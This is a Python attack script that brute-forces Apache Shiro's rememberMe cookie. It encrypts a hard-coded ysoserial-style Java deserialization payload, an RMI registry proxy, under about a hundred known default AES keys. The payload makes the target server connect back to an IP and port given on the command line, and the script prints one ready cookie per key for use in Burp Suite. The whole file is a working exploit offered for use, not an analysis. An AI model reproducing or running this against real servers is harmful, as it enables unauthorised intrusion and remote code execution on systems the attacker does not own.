#!/usr/bin/env python3
# @Time    : 2020-06-15
# @Author  : caicai
# @File    : shiro_find_key.py

import binascii
import uuid
import base64
from Crypto.Cipher import AES
import struct
import sys

'''
工具生成payload，在burpsuite中枚举Cookie
'''

def encode_rememberme(domain, port, shirokey):
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode(shirokey)
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)

    file_body = pad(get_ysoserial_data(domain, port))
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)).decode()
    return base64_ciphertext


def get_ysoserial_data(domain, port):
    data = "aced0005737d00000001001a6a6176612e726d692e72656769737472792e5265676973747279787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b78707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657200000000000000020200007872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000078707751000a556e696361737452656600"
    data += ''.join(['%02X' % b for b in struct.pack('>B',len(domain))]).lower()
    data += binascii.b2a_hex(domain.encode()).decode()
    data += "0000"
    data += ''.join(['%02X' % b for b in struct.pack('>H', int(port))]).lower()
    data += "9431fb80"
    data += "00000000000000000000000000000078"
    return bytes(bytearray.fromhex(data) + b"\t\t\t\t\t\t\t\t\t")


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("python3 file.py ip port")
    else:
        keys = [
            "kPH+bIxk5D2deZiIxcaaaA==",
            "4AvVhmFLUs0KTA3Kprsdag==",
            "Z3VucwAAAAAAAAAAAAAAAA==",
            "fCq+/xW488hMTCD+cmJ3aQ==",
            "0AvVhmFLUs0KTA3Kprsdag==",
            "1AvVhdsgUs0FSA3SDFAdag==",
            "1QWLxg+NYmxraMoxAXu/Iw==",
            "25BsmdYwjnfcWmnhAciDDg==",
            "2AvVhdsgUs0FSA3SDFAdag==",
            "3AvVhmFLUs0KTA3Kprsdag==",
            "3JvYhmBLUs0ETA5Kprsdag==",
            "r0e3c16IdVkouZgk1TKVMg==",
            "5aaC5qKm5oqA5pyvAAAAAA==",
            "5AvVhmFLUs0KTA3Kprsdag==",
            "6AvVhmFLUs0KTA3Kprsdag==",
            "6NfXkC7YVCV5DASIrEm1Rg==",
            "6ZmI6I2j5Y+R5aSn5ZOlAA==",
            "cmVtZW1iZXJNZQAAAAAAAA==",
            "7AvVhmFLUs0KTA3Kprsdag==",
            "8AvVhmFLUs0KTA3Kprsdag==",
            "8BvVhmFLUs0KTA3Kprsdag==",
            "9AvVhmFLUs0KTA3Kprsdag==",
            "OUHYQzxQ/W9e/UjiAGu6rg==",
            "a3dvbmcAAAAAAAAAAAAAAA==",
            "aU1pcmFjbGVpTWlyYWNsZQ==",
            "bWljcm9zAAAAAAAAAAAAAA==",
            "bWluZS1hc3NldC1rZXk6QQ==",
            "bXRvbnMAAAAAAAAAAAAAAA==",
            "ZUdsaGJuSmxibVI2ZHc9PQ==",
            "wGiHplamyXlVB11UXWol8g==",
            "U3ByaW5nQmxhZGUAAAAAAA==",
            "MTIzNDU2Nzg5MGFiY2RlZg==",
            "L7RioUULEFhRyxM7a2R/Yg==",
            "a2VlcE9uR29pbmdBbmRGaQ==",
            "WcfHGU25gNnTxTlmJMeSpw==",
            "OY//C4rhfwNxCQAQCrQQ1Q==",
            "5J7bIJIV0LQSN3c9LPitBQ==",
            "f/SY5TIve5WWzT4aQlABJA==",
            "bya2HkYo57u6fWh5theAWw==",
            "WuB+y2gcHRnY2Lg9+Aqmqg==",
            "kPv59vyqzj00x11LXJZTjJ2UHW48jzHN",
            "3qDVdLawoIr1xFd6ietnwg==",
            "YI1+nBV//m7ELrIyDHm6DQ==",
            "6Zm+6I2j5Y+R5aS+5ZOlAA==",
            "2A2V+RFLUs+eTA3Kpr+dag==",
            "6ZmI6I2j3Y+R1aSn5BOlAA==",
            "SkZpbmFsQmxhZGUAAAAAAA==",
            "2cVtiE83c4lIrELJwKGJUw==",
            "fsHspZw/92PrS3XrPW+vxw==",
            "XTx6CKLo/SdSgub+OPHSrw==",
            "sHdIjUN6tzhl8xZMG3ULCQ==",
            "O4pdf+7e+mZe8NyxMTPJmQ==",
            "HWrBltGvEZc14h9VpMvZWw==",
            "rPNqM6uKFCyaL10AK51UkQ==",
            "Y1JxNSPXVwMkyvES/kJGeQ==",
            "lT2UvDUmQwewm6mMoiw4Ig==",
            "MPdCMZ9urzEA50JDlDYYDg==",
            "xVmmoltfpb8tTceuT5R7Bw==",
            "c+3hFGPjbgzGdrC+MHgoRQ==",
            "ClLk69oNcA3m+s0jIMIkpg==",
            "Bf7MfkNR0axGGptozrebag==",
            "1tC/xrDYs8ey+sa3emtiYw==",
            "ZmFsYWRvLnh5ei5zaGlybw==",
            "cGhyYWNrY3RmREUhfiMkZA==",
            "IduElDUpDDXE677ZkhhKnQ==",
            "yeAAo1E8BOeAYfBlm4NG9Q==",
            "cGljYXMAAAAAAAAAAAAAAA==",
            "2itfW92XazYRi5ltW0M2yA==",
            "XgGkgqGqYrix9lI6vxcrRw==",
            "ertVhmFLUs0KTA3Kprsdag==",
            "5AvVhmFLUS0ATA4Kprsdag==",
            "s0KTA3mFLUprK4AvVhsdag==",
            "hBlzKg78ajaZuTE0VLzDDg==",
            "9FvVhtFLUs0KnA3Kprsdyg==",
            "d2ViUmVtZW1iZXJNZUtleQ==",
            "yNeUgSzL/CfiWw1GALg6Ag==",
            "NGk/3cQ6F5/UNPRh8LpMIg==",
            "4BvVhmFLUs0KTA3Kprsdag==",
            "MzVeSkYyWTI2OFVLZjRzZg==",
            "empodDEyMwAAAAAAAAAAAA==",
            "A7UzJgh1+EWj5oBFi+mSgw==",
            "c2hpcm9fYmF0aXMzMgAAAA==",
            "i45FVt72K2kLgvFrJtoZRw==",
            "U3BAbW5nQmxhZGUAAAAAAA==",
            "ZnJlc2h6Y24xMjM0NTY3OA==",
            "Jt3C93kMR9D5e8QzwfsiMw==",
            "MTIzNDU2NzgxMjM0NTY3OA==",
            "vXP33AonIp9bFwGl7aT7rA==",
            "V2hhdCBUaGUgSGVsbAAAAA==",
            "Q01TX0JGTFlLRVlfMjAxOQ==",
            "ZAvph3dsQs0FSL3SDFAdag==",
            "Is9zJ3pzNh2cgTHB4ua3+Q==",
            "NsZXjXVklWPZwOfkvk6kUA==",
            "GAevYnznvgNCURavBhCr1w==",
            "66v1O8keKNV3TTcGPK1wzg==",
            "SDKOLKn2J1j/2BHjeZwAoQ==",
        ]
        print("use ip:{} port:{}".format(sys.argv[1],sys.argv[2]))
        for key in keys:
            cookie = "rememberMe={}".format(encode_rememberme(sys.argv[1], sys.argv[2],key))
            print(cookie)
